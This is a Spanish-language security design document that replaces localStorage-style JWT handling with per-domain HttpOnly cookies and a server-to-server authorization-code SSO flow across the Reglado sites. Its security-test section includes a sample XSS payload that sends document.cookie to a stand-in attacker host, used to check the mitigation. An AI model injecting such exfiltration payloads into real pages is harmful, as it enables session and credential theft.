# L7 — Cookie HttpOnly para el JWT (rediseño 2026-04-30)

**Fecha**: 2026-04-30
**Proyecto**: ApiLoging + frontends del ecosistema Reglado
**Estado**: Diseño aprobado
**Reemplaza**: el plan de L7 documentado en [`HARDENING_APILOGING_PENDIENTE.md`](../../HARDENING_APILOGING_PENDIENTE.md), que asumía dominios bajo un mismo apex (`Domain=.regladogroup.com`) — premisa que no se cumple en la arquitectura real.
**Fuera de alcance**: `Inmobiliaria_Reglados` (mantenimiento externo, se incorpora cuando vuelva el equipo) y `RegladoBienesRaices` (proyecto histórico sin uso activo).

---

## Contexto

El plan original de L7 partía de la premisa "todos los frontends bajo subdominios de `regladogroup.com`" y proponía una cookie compartida `Domain=.regladogroup.com`. La realidad del ecosistema es distinta: cada proyecto vive en su propio eTLD+1 (`regladogroup.com`, `regladoenergy.com`, `regladomaps.com`, `regladorealestate.com`, etc.), y la única excepción es `chatbot.regladogroup.com` que sí es subdominio. Por diseño del navegador, las cookies no se pueden compartir entre eTLD+1 distintos.

Adicionalmente, las cookies third-party con `SameSite=None; Secure` están en deprecación (Chrome Privacy Sandbox, Safari ITP, Firefox Total Cookie Protection). Cualquier solución que intente cookies cross-site no es viable a medio plazo.

Este rediseño se basa en **HttpOnly cookies por dominio**, transportando el JWT entre dominios mediante un **authorization code flow** (estilo OAuth2) que evita que el JWT pase por JavaScript del cliente.

## Objetivo

Cerrar dos vectores concretos del modelo de amenazas:

1. **Exfiltración del JWT vía XSS**: el token nunca debe ser legible desde JavaScript del cliente.
2. **Persistencia post-tab-close** del token en caso de captura: si un atacante consigue el token, debe expirar pronto y no poder ser exfiltrado a su servidor.

**No cierra** (explícitamente): el abuso same-session vía XSS-injected `fetch` con credenciales. Eso lo cierra una CSP estricta (F1, ya parcialmente implementada).

## Decisiones clave

| Decisión | Elección |
|---|---|
| Almacenamiento del JWT en cliente | **HttpOnly cookie por dominio**, sin third-party cookies. |
| Acceso del frontend a ApiLoging | **Vía proxy local** en el `BACKEND/` de cada frontend (mismo origen). El frontend nunca llama directo a `regladogroup.com/auth/*` desde otro dominio. |
| Handoff cross-domain (SSO) | **Authorization code flow**: Grupo emite un `code` single-use de TTL 30s; el backend del destino lo canjea server-to-server por el JWT. El JWT nunca pasa por el navegador del usuario. |
| Autenticación backend↔ApiLoging | **API key per-backend** en `.env` de cada `BACKEND/`. ApiLoging valida key + origen objetivo. |
| Modo de transición | **Compatibilidad** — ApiLoging acepta cookie OR `Authorization: Bearer` durante todo el rollout. Se deprecia el Bearer fallback al final. |
| Rollout | **Por fases**: Grupo primero (ApiLoging same-domain), Energy + Ingenieria después (paralelizables), Maps a continuación (requiere crear `BACKEND/` desde cero), Inmobiliaria cuando el equipo externo vuelva. |

## Modelo de amenazas

| Vector | Estado tras L7 | Notas |
|---|---|---|
| Exfiltración del JWT vía XSS (JS lee `document.cookie`) | ✅ Cerrado | HttpOnly impide acceso desde JS. |
| Persistencia post-tab-close si XSS captura token | ✅ Cerrado | Token nunca expuesto a JS. |
| Replay del `?code=` interceptado en URL | ✅ Cerrado | TTL 30s + single-use enforcement + validación de `target_origin`. |
| Abuso same-session vía XSS `fetch` con credenciales | ❌ NO cerrado | Lo cierra CSP estricta (F1). HttpOnly NO es bala de plata. |
| Robo de cookie vía MITM | ✅ Cerrado | `Secure` flag exige HTTPS. |
| Fuga de API key del backend | ⚠️ Mismo riesgo que `JWT_SECRET` hoy | Permisos de filesystem en `.env`, gitignored, rotación documentada. |

## Arquitectura

```
NAVEGADOR del usuario
   │
   │   (HttpOnly cookie de regladoenergy.com — invisible a JS)
   ↓
FRONTEND  regladoenergy.com  ─→  llamadas same-origin /auth/*
                                     │
                                     ↓
                           BACKEND  regladoenergy.com  (auth proxy)
                                     │
                                     │   HTTP server-to-server
                                     │   Authorization: Bearer <api_key>
                                     ↓
                              APILOGING  regladogroup.com

HANDOFF cross-domain (SSO):
1. Usuario logueado en Grupo navega hacia Energy.
2. Grupo (frontend) llama POST /auth/sso-issue-code → recibe ?code=ABC.
3. Grupo redirige a regladoenergy.com/auth/sso-exchange.php?code=ABC.
4. Backend de Energy llama POST /auth/exchange-code (server-to-server con API key).
5. ApiLoging valida code, devuelve {token, user}.
6. Backend de Energy hace Set-Cookie auth_token (HttpOnly, Secure, SameSite=Lax) sobre regladoenergy.com.
7. Backend redirige al usuario a https://regladoenergy.com/.

EL JWT NUNCA PASA POR EL NAVEGADOR DEL USUARIO.
```

## Cambios en ApiLoging (fase 1)

### Tabla nueva

Archivo: `database/migrate_l7_sso_codes.sql`

```sql
CREATE TABLE IF NOT EXISTS sso_exchange_codes (
  code           VARCHAR(64) PRIMARY KEY,
  user_id        INT NOT NULL,
  sid            VARCHAR(64) NOT NULL,
  target_origin  VARCHAR(255) NOT NULL,
  expires_at     TIMESTAMP NOT NULL,
  used_at        TIMESTAMP NULL,
  created_at     TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  INDEX idx_expires_at (expires_at),
  INDEX idx_user_id (user_id)
) ENGINE=InnoDB;
```

Actualizar también `database/schema.sql` para instalaciones limpias.

### Endpoints modificados

`POST /auth/login`
- Tras validar credenciales, además de devolver `{token, user}` en JSON, setea:
  ```
  Set-Cookie: auth_token=<jwt>; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=86400
  ```
- En `APP_ENV=local` se omite el flag `Secure` (igual que ya hace ApiLoging para HSTS).

`POST /auth/logout`
- Tras revocar el JWT, setea `Set-Cookie: auth_token=; Max-Age=0; Path=/` para limpiar la cookie.

`AuthMiddleware::extractBearerToken()` se renombra a `extractToken()` y prioriza:
1. Cookie `auth_token` → si existe, usarla.
2. Header `Authorization: Bearer ...` → fallback de transición.
3. Si ninguno, 401.

### Endpoints nuevos

`POST /auth/sso-issue-code` (autenticado, llamado desde Grupo)
- Body: `{"target_origin": "https://regladoenergy.com"}`
- Validaciones:
  - Sesión activa (cookie/Bearer válido).
  - `target_origin` está en `REDIRECT_ALLOWED_ORIGINS`.
- Acción:
  - Genera `code = bin2hex(random_bytes(32))` (64 chars hex).
  - Inserta en `sso_exchange_codes` con `expires_at = NOW() + INTERVAL 30 SECOND`.
- Respuesta: `{"code": "..."}`

`POST /auth/exchange-code` (server-to-server, requiere API key)
- Headers: `Authorization: Bearer <api_key>` (la del backend que llama).
- Body: `{"code": "...", "requesting_origin": "https://regladoenergy.com"}`
- Validaciones:
  - API key válida en `BACKEND_API_KEYS`.
  - `requesting_origin` coincide con la registrada para esa API key.
  - `code` existe en `sso_exchange_codes`.
  - `code.target_origin == requesting_origin`.
  - `code.used_at IS NULL` y `code.expires_at > NOW()`.
- Acción:
  - `UPDATE sso_exchange_codes SET used_at = NOW() WHERE code = ?` (atómico, single-use).
  - Genera JWT fresco con el `sid` y `user_id` del code.
- Respuesta: `{"token": "<jwt>", "user": {...}}`

### Config nueva

En `.env` (y `.env.example`):

```
BACKEND_API_KEYS=energy:abc123...,ingenieria:def456...,maps:ghi789...
```

Formato: lista de `<frontend_name>:<api_key>` separadas por coma. Cada `frontend_name` mapea a su `target_origin` mediante una constante en código.

### Cron `cleanup.php`

Se extiende para purgar `sso_exchange_codes` con `expires_at < NOW() - INTERVAL 1 DAY` (los codes ya expirados que no se purgaron antes).

## Cambios en GrupoReglado (fase 1)

### Frontend

`services/auth.js`:
- Quitar `Authorization: Bearer ${token}` de todos los `request()`.
- Cambiar `fetch(...)` a incluir `credentials: 'include'`.
- `state.token` desaparece (ya no es legible). Mantener solo `state.user` y `state.loading`.
- Ajustar `setSession`/`clearSession` para no manipular cookie ni token en cliente.

`services/ssoClient.js`:
- `redirectToStore(returnTo)` ya no recibe el token como parámetro:
  1. POST a `/auth/sso-issue-code` con `target_origin = new URL(returnTo).origin`.
  2. Recibe `{code}`.
  3. Redirige a `${returnTo}/auth/sso-exchange.php?code=${code}`.

`services/ssoHub.js`:
- `buildReturnUrlWithTokenFragment` se elimina o se renombra.
- Sustituido por la lógica del code flow.

`pages/SsoStoreView.vue`:
- Simplificar drásticamente: ya no necesita parsear `?token=` de la URL (el flujo nuevo no pasa por aquí en el destino — el backend es quien recibe el code).
- Esta vista probablemente desaparece o queda solo para el caso "Grupo es el origen y propaga al hub".

`pages/LoginView.vue`, `pages/SettingsView.vue`, etc.:
- Sin cambios de lógica — siguen llamando a `/auth/me`, `/auth/login`, etc. La diferencia es que ahora la cookie se incluye automáticamente con `credentials: 'include'`.

### Backend (api_backend = ApiLoging)

ApiLoging ya está integrado en `regladogroup.com` vía `.htaccess` rewrites. No hay backend extra que crear: las llamadas del frontend de Grupo a `/auth/*` ya van a ApiLoging. Solo aplicarán los cambios descritos en "Cambios en ApiLoging".

## Cambios en Energy / Ingenieria (fase 2, replicable)

### Backend

Carpeta nueva: `BACKEND/auth/` (o subcarpeta dentro de `BACKEND/` existente).

`auth/sso-exchange.php`
```php
// 1. Lee ?code= de la query string.
// 2. POST server-to-server a APILOGING_BASE_URL + '/auth/exchange-code'
//    con Authorization: Bearer APILOGING_API_KEY,
//    body {"code": ..., "requesting_origin": SITE_ORIGIN}.
// 3. Recibe {token, user}.
// 4. setcookie('auth_token', $token, [HttpOnly, Secure, SameSite=Lax, Path=/, expires=now+24h]).
// 5. Header('Location: /').
```

`auth/me.php`
```php
// 1. Lee cookie auth_token. Si no existe, 401.
// 2. GET server-to-server a APILOGING_BASE_URL + '/auth/me' con Authorization: Bearer <jwt>.
// 3. Devuelve la respuesta tal cual.
```

`auth/logout.php`
```php
// 1. Lee cookie auth_token.
// 2. POST server-to-server a APILOGING_BASE_URL + '/auth/logout' con Bearer.
// 3. setcookie('auth_token', '', [Max-Age=0, Path=/]).
// 4. Header('Location: https://regladogroup.com/sso-logout?return=' + SITE_ORIGIN).
```

`auth/proxy.php` (genérico) o endpoints específicos
- Pattern uniforme para cualquier llamada que el frontend necesite hacer a ApiLoging (ej. `/auth/update-name`, `/auth/change-password`).
- Lee cookie, reenvía con `Authorization: Bearer`, devuelve respuesta.

`auth.php` (existente, validador de JWT para los endpoints de admin/contact)
- Cambio mínimo: leer JWT del cookie `auth_token` en lugar de `Authorization` header. 2-3 líneas.

### Frontend

`services/auth.js`:
- `API_BASE` cambia de `import.meta.env.VITE_AUTH_API_URL` a `'/auth'` (relativo, mismo origen).
- Todas las llamadas con `credentials: 'include'`.
- Quitar `setCookie`/`getCookie` del JWT — ya no aplica.
- `state.token` desaparece.

`services/ssoClient.js`:
- `consumeTokenFromFragment` deja de aplicar (no llega fragment-token nunca al frontend).
- El `bootstrapAuth` se simplifica: simplemente llamar a `/auth/me` y, si 401, redirigir a Grupo `/sso-handshake`.

### Vite dev

`vite.config.js`:
```js
server: {
  proxy: {
    '/auth': 'http://localhost:8001'   // o el puerto del BACKEND PHP
  }
}
```

### `.env` nuevo (en `BACKEND/.env`)

```
APILOGING_BASE_URL=http://localhost:8000   # prod: https://regladogroup.com
APILOGING_API_KEY=abc123...                # registrado en ApiLoging
SITE_ORIGIN=http://localhost:5174          # prod: https://regladoenergy.com
```

## Cambios en Maps (fase 3)

Crear `BACKEND/` desde cero con los mismos endpoints que Energy/Ingenieria. La skill `levantar-reglado` se actualiza para incluir el nuevo backend en su lista de servicios (puerto sugerido `8004`, ejecución `php -S localhost:8004`). Maps es parte del ecosistema y debe quedar al mismo nivel de protección que el resto, aunque su superficie XSS sea menor (visor de mapas) — la coherencia entre frontends prevalece.

## Cambios en Inmobiliaria (parqueado)

Mismo patrón que Energy/Ingenieria. Cuando el equipo externo esté disponible, coordinar:
1. Despliegue de la fase 1 (ApiLoging + Grupo) — ya estará vivo.
2. Equipo externo replica el patrón en su `BACKEND/`.
3. Registrar la API key de Inmobiliaria en `BACKEND_API_KEYS`.
4. Desplegar coordinado.

Se actualiza [`PENDIENTE_INMOBILIARIA_APILOGING.md`](../../PENDIENTE_INMOBILIARIA_APILOGING.md) con el procedimiento concreto cuando llegue el momento.

## Estrategia de migración (compatibilidad durante el rollout)

ApiLoging soporta **AMBOS** modos durante todo el rollout:

```
AuthMiddleware::extractToken():
  1. Cookie 'auth_token' presente → usarla
  2. Header Authorization: Bearer presente → usarla (fallback de transición)
  3. Ninguno → 401
```

Con esto:
- **Fase 1 desplegada, fase 2 sin migrar**: Energy/Ingenieria siguen mandando `Bearer`. ApiLoging lo acepta. Cero rotura.
- **Fase 1 + 2 desplegadas, fase 3 sin migrar**: Maps sigue con `Bearer`. Resto con cookie.
- **Todas migradas**: deprecate del fallback `Bearer` en una release posterior (cleanup, no urgente).

**Cero downtime requerido**: cada fase es independiente.

## Testing

### Unit tests (ApiLoging)

- `sso_exchange_codes`: insertar, marcar `used`, no permitir reuso (segunda llamada con mismo code → error).
- Codes expirados (`expires_at < NOW()`) son rechazados.
- `POST /auth/exchange-code`:
  - API key inválida → 401.
  - `requesting_origin != target_origin` → 403.
  - Code ya usado → 410 Gone.
  - Code expirado → 410 Gone.
- `POST /auth/sso-issue-code`:
  - `target_origin` no en `REDIRECT_ALLOWED_ORIGINS` → 403.
  - Sin sesión activa → 401.
- `AuthMiddleware`: cookie tiene prioridad sobre Bearer.

### E2E tests (manuales o Playwright)

1. Login en Grupo → DevTools → Application → Cookies → confirma `auth_token` con flags `HttpOnly + Secure (en prod) + SameSite=Lax`.
2. DevTools → Console → `document.cookie` no incluye `auth_token`.
3. Click "Ir a Energy" → URL final pasa por `?code=...` y aterriza en `regladoenergy.com/` con cookie HttpOnly de ese dominio.
4. Refresh en Energy → `/auth/me` (vía proxy local) responde 200, sigue logueado.
5. Logout en Energy → cookie de Energy borrada → redirect a Grupo `/sso-logout` → cookie de Grupo borrada.
6. Reabrir Grupo → no hay sesión.

### Tests de seguridad

- DevTools → Console → `document.cookie = "auth_token=fake"` → siguiente request es 401 (firma JWT inválida).
- Capturar `?code=` de la URL antes de canje → segunda llamada con mismo code → 410 Gone.
- Simular exfiltración: `<script>fetch("//attacker.com?c="+document.cookie)</script>` → cookie sale **vacía** (HttpOnly funcionando).
- Simular abuso same-session: `<script>fetch("/auth/me",{credentials:"include"})</script>` → SÍ funciona (esto NO lo cierra L7, lo cierra F1).

## Riesgos y mitigaciones

| Riesgo | Mitigación |
|---|---|
| Fuga de API key del backend | Permisos de filesystem en `.env`, gitignored. Rotación documentada. Mismo riesgo y mismo modelo que `JWT_SECRET` hoy. |
| Replay del `code` antes del canje | TTL 30s + single-use enforcement + validación de `target_origin`. Window real <1s en navegación normal. |
| Cookie no se setea en local sin HTTPS | `Secure` flag condicionado a `APP_ENV !== 'local'`. |
| Cookie size > 4 KB | JWT actual ~500 bytes. Margen sobrado. |
| CORS preflight cross-domain | No aplica: todas las llamadas frontend→ApiLoging pasan por proxy local (mismo origen). |
| Logout no propaga automáticamente a todos los dominios | Igual que hoy: el JWT revocado server-side hace que el siguiente `/auth/me` de cada dominio devuelva 401 → cierre local automático. SSO Hub `/sso-logout` cubre Grupo explícitamente. |
| bfcache (back-forward cache) | El cookie HttpOnly no afecta al bfcache. Si hay otros listeners que lo bloqueen, es trabajo separado. |
| Confusión durante transición | ApiLoging acepta ambos modos. Frontends migrados y no migrados conviven sin choques. |

## Costes estimados

| Fase | Días | Bloqueante con |
|---|---|---|
| 1 — ApiLoging + Grupo | 2-3 | — |
| 2a — Energy | 1.5 | Fase 1 desplegada |
| 2b — Ingenieria | 1.5 | Fase 1 desplegada (paralelizable con 2a) |
| 3 — Maps | 2 | Fase 1 desplegada |
| 4 — Inmobiliaria | 1.5 | Equipo externo disponible |
| Cleanup deprecation Bearer | 0.5 | Todas las anteriores |
| **TOTAL ecosistema** | **~10 días** | |

## Out of scope (explícitamente)

- **L2 (refresh tokens)** — separado. La sesión sigue siendo de 24h tras este diseño.
- **F1 (CSP estricto)** — el cierre real de XSS está ahí, no en L7.
- **Detección y bloqueo de replay attacks más allá de single-use** — el TTL 30s + single-use es suficiente para el modelo de amenaza acordado.
- **bfcache** — el "1 motivo de error" reportado por Lighthouse en Maps/Grupo es por listeners no relacionados con auth. Trabajo separado.
- **Inmobiliaria fase activa** — coordinar con equipo externo. Documentación en `PENDIENTE_INMOBILIARIA_APILOGING.md` cuando llegue el momento.

## Referencias internas

- Plan original (obsoleto): [`docs/HARDENING_APILOGING_PENDIENTE.md`](../../HARDENING_APILOGING_PENDIENTE.md), sección L7.
- Spec del SSO Hub actual: [`docs/ECOSYSTEM_AUTH_SSO_HUB.md`](../../ECOSYSTEM_AUTH_SSO_HUB.md).
- Proyectos en dominios independientes (memoria persistente): `~/.claude/projects/c--xampp-htdocs-Reglado/memory/project_dominios_independientes.md`.
